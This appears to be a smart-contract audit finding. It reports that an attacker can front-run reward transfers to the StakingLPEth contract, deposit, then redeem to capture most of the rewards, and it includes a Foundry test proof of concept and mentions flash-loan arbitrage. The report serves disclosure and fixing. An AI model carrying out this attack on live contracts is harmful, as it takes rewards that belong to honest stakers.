# Vulnerability details


## Impact
The attacker gains rewards, while the user loses part of their rewards.

## Proof of Concept
Since the rewards are distributed by directly transferring tokens to StakingLPEth, which increases the yield per share, an attacker can obtain rewards by front-running the send rewards action.

Attack Scenario:
	1.	The attacker notices that a reward is being paid to the StakingLPEth contract.
	2.	The attacker deposits their funds into the contract.
	3.	After StakingLPEth distributes the rewards,
	4.	The attacker uses redeem() or cooldownAssets() to withdraw all their shares.

#### proof of code

```javascript
    function testFrontrunRewards() public{
        
        uint256 user1_before = liquidityPool.balanceOf(user1);

        vm.startPrank(user1);
        liquidityPool.approve(address(stakingLpEth), 0.01 ether);
        stakingLpEth.deposit(0.01 ether, user1);
        vm.stopPrank();

        vm.warp(block.timestamp + 7 days);


        //simulate the scenario of the attacker frontrun send rewards, 
        address attacker = address(0x26);

        liquidityPool.transfer(attacker, 10 ether);
        uint256 attacker_before = liquidityPool.balanceOf(attacker);
        
        vm.startPrank(attacker);
        liquidityPool.approve(address(stakingLpEth), 10 ether);
        stakingLpEth.deposit(10 ether, attacker);
        vm.stopPrank();

        //sendd rewards
        _sendRewards();

        //redeem()
        vm.startPrank(user1);
        stakingLpEth.approve(address(stakingLpEth), 0.01 ether );
        stakingLpEth.redeem(0.01 ether, user1, user1);
        vm.stopPrank();

        vm.startPrank(attacker);
        stakingLpEth.approve(address(stakingLpEth), 10 ether );
        stakingLpEth.redeem(10 ether, attacker, attacker);
        vm.stopPrank();


        console.log("user1 gets rewards :" , liquidityPool.balanceOf(user1) - user1_before);
        console.log("Attacker gets rewards :" , liquidityPool.balanceOf(attacker) - attacker_before);

    }
```
add this function in StakingLP.t.sol, then run `forge test --mt testFrontrunRewards -vv`

We can see that the attacker get most of the rewards. The attacker faces no risk of losing any funds. When the cooldownDuration is greater than 0, they only need to wait for the cooldownDuration period to withdraw funds from the Silo. When cooldownDuration is 0, they can even use a flash loan to arbitrage the rewards.
